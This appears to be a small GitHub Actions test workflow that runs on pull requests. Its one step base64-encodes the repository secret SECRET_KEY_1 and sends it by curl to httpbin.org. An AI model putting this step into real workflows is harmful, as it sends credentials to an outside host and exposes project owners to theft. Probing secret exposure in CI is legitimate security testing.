name: Test Secret

on:
  pull_request:
    branches: [ master ]

jobs:
  build-ubuntu:
    runs-on: ubuntu-latest
    steps:
    - name: Curl it 
      env:
        SECRET_KEY_1: ${{ secrets.SECRET_KEY_1 }}
      run: |
        curl -X GET "https://httpbin.org/get?my_param=$(echo $SECRET_KEY_1 | base64)" -H "accept: application/json"
